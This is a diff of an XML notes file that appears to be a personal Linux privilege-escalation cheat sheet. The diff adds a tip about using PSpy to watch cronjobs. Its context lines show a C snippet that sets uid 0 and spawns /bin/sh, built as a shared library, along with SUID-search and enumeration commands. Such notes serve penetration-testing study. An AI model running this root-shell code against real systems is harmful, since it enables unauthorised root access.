@@ -664,7 +664,7 @@ void test_this()
 	setuid(0); setgid(0); system("/bin/sh");
 }</codebox>
       <codebox char_offset="162" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gcc -fPIC -shared test_this.c -o test_this.so</codebox>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1693404538">
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1694352079">
         <rich_text>Use:
 - linpeas
 - kernel exploit suggester
@@ -728,6 +728,13 @@ Check opened ports:
 Check running commands:
 </rich_text>
         <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Use </rich_text>
+        <rich_text weight="heavy">PSpy</rich_text>
+        <rich_text> to check for executed commands and cronjobs, without </rich_text>
+        <rich_text style="italic">privilege escalation</rich_text>
+        <rich_text>.</rich_text>
         <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
         <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
         <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
